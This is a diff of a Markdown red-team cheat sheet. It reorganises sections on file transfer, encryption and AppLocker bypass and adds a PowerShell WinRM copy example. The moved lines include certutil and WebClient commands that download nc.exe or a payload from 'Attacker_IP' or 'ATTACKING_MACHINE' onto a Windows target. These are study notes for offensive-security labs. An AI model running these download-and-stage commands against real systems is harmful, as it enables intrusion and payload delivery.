@@ -25,10 +25,11 @@
     - [BITSAdmin](#bitsadmin)
     - [FindStr](#findstr)
     - [Execution](#execution)
-  - [File Transfer](#file-transfer)
-    - [Download](#download)
-    - [Upload](#upload)
-    - [Encrpytion](#encrpytion)
+- [File Transfer](#file-transfer)
+  - [Download](#download)
+  - [Upload](#upload)
+  - [Encrpytion](#encrpytion)
+  - [Native tools](#native-tools)
 - [Bypass Applocker](#bypass-applocker)
   - [Privilege Escalation](#privilege-escalation)
     - [Incognito](#incognito)
@@ -749,8 +750,8 @@ $snap.LogPipelineExecutionDetails = $false
   - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
 
 
-### File Transfer
-#### Download
+## File Transfer
+### Download
 
 - **Enconding**
   - md5sum
@@ -813,20 +814,7 @@ echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 
-- **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
-- certification services
-- dump + diplay certfication authority
-- Ingress tool transfer
-- Download
-  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
-- Encode / Decode
-  - certutil -encode payload.exe Encoded-payload.txt
-  - certutil -decode Encoded_file payload.txt
-  
-- copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
-
-
-#### Upload
+### Upload
 - **Base64**
   - [Convert]::ToBase64String((Get-Content -path "C:\Path\To\File" -Encoding byte))
     -  Get-FileHash C:\Path\To\File -Algorithm MD5 | select Hash
@@ -889,10 +877,39 @@ echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 
-#### Encrpytion
+- **PowerShell WinRM**
+  - Execute commands on remote computer: Member of group | Admin | Permissions
+```
+Test-NetConnection -ComputerName COMPUTERNAME -Port 5985
+$Session = New-PSSession -ComputerName COMPUTERNAME
+
+# LH=DB
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+# DB=LH
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### Encrpytion
 - Upload ps1 script to target + import
   - Import-Module .\Invoke-AESEncryption.ps1
   - Output file.ext.aes
+
+### Native tools
+- [Windows - Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/)
+  - /upload
+
+- **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+- certification services
+- dump + diplay certfication authority
+- Ingress tool transfer
+- Download
+  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+- Encode / Decode
+  - certutil -encode payload.exe Encoded-payload.txt
+  - certutil -decode Encoded_file payload.txt
+  
+- copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
 
 ## Bypass Applocker
 - Applocker: restrict programs from being executed
